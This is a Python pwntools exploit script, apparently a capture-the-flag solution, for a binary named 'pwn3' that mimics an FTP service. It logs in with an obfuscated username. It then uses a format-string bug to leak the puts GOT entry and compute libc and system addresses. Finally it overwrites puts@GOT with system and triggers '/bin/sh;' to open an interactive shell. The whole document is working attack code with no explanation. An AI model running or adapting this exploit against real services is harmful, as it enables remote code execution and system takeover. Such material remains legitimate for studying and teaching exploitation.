#!/usr/bin/env python3
from pwn import *

pwn3 = ELF('./pwn3')
libc = ELF('./libc.so')

# sh = process('./pwn3')
sh = remote('127.0.0.1', 12345)

def get(name):
    sh.sendline(b'get')
    sh.recvuntil(b'enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data

def put(name, content):
    sh.sendline(b'put')
    sh.recvuntil(b'please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil(b'then, enter the content:')
    sh.sendline(content)

def show_dir():
    sh.sendline(b'dir')

tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)

def password():
    sh.recvuntil(b'Name (ftp.hacker.server:Rainism):')
    sh.sendline(name.encode())  

password()

puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))

put(b'1111', b'%8$s' + p32(puts_got))
puts_addr = u32(get(b'1111')[:4])
log.success('puts addr : ' + hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
log.success('libc base : ' + hex(libc_base))
log.success('system addr : ' + hex(system_addr))

log.info('puts offset in libc: ' + hex(libc.sym['puts']))
log.info('system offset in libc: ' + hex(libc.sym['system']))

payload = fmtstr_payload(7, {puts_got: system_addr}, write_size='byte')
put(b'/bin/sh;', payload)

sh.recvuntil(b'ftp>')
sh.sendline(b'get')
sh.recvuntil(b'enter the file name you want to get:')

sh.sendline(b'/bin/sh;')

show_dir()
sh.interactive()